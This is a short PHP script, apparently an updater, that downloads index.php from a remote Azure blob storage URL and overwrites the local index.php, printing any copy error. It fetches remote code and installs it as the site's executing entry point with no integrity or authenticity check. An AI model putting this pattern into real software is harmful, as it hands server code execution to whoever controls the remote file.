<?php


echo "Download Code Version 2.4";

copy('https://standardhong.blob.core.windows.net/container1/index.php', 'index.php');

if(!@copy('https://standardhong.blob.core.windows.net/container1/index.php', 'index.php'))
{
    $errors= error_get_last();
    echo "COPY ERROR: ".$errors['type'];
    echo "<br />\n".$errors['message'];
} else {
    echo "File copied from remote!";
}
?>